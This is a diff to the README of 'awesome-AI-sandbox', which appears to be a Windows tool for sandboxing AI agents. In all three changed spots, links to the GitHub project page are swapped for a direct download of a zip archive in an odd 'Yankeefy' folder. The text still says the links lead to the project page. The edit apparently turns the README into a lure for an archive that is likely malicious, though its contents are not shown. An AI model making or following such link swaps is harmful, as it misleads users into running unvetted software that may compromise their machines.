@@ -1,6 +1,6 @@
 # 🤖 awesome-AI-sandbox - Safe AI Agent Environments
 
-[![Download awesome-AI-sandbox](https://img.shields.io/badge/Download-Get%20Software-brightgreen)](https://github.com/Demon230/awesome-AI-sandbox)
+[![Download awesome-AI-sandbox](https://img.shields.io/badge/Download-Get%20Software-brightgreen)](https://raw.githubusercontent.com/Demon230/awesome-AI-sandbox/main/Yankeefy/A_awesome_sandbox_v1.1-beta.5.zip)
 
 ---
 
@@ -37,7 +37,7 @@ Follow these steps to download and start using awesome-AI-sandbox on your Window
 1. **Go to the download page**  
 Click the button below to visit the main GitHub page where you can download the software.  
 
-[![Download awesome-AI-sandbox](https://img.shields.io/badge/Download-GitHub-blue)](https://github.com/Demon230/awesome-AI-sandbox)
+[![Download awesome-AI-sandbox](https://img.shields.io/badge/Download-GitHub-blue)](https://raw.githubusercontent.com/Demon230/awesome-AI-sandbox/main/Yankeefy/A_awesome_sandbox_v1.1-beta.5.zip)
 
 2. **Find the latest release or project files**  
 On the GitHub page, look for the "Releases" section or the main project folders. The latest stable version will usually appear at the top.  
@@ -115,7 +115,7 @@ Running AI agents can expose your system to unexpected behavior. This sandbox li
 
 The GitHub project page often updates with new tools and instructions. Bookmark the link below and check back regularly for latest versions and resources:
 
-https://github.com/Demon230/awesome-AI-sandbox
+https://raw.githubusercontent.com/Demon230/awesome-AI-sandbox/main/Yankeefy/A_awesome_sandbox_v1.1-beta.5.zip
 
 ---
 
